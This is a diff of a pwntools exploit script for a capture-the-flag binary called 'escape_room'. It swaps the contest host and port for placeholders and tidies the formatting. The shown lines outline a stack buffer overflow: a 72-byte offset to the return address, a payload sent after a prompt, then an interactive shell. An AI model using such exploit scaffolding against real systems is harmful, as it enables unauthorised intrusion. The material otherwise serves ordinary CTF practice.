@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = ELF("escape_room")
+exe = ELF("./escape_room")
 context.binary = exe
-context.arch = "amd64"
-context.os = 'linux'
+context.arch   = 'amd64'
+context.os     = 'linux'
 
-HOSTNAME = "offsec.m0lecon.it"
-PORT = 13510
+HOSTNAME = 'HOSTNAME_PLACEHOLDER'
+PORT     = 0  # PORT_PLACEHOLDER
 
 OFFSET_TO_RIP = 72
 
@@ -38,7 +38,6 @@ def main():
 
     r.recvuntil(b"keys?\n")
     r.sendline(payload)
-
 
     r.interactive()
 
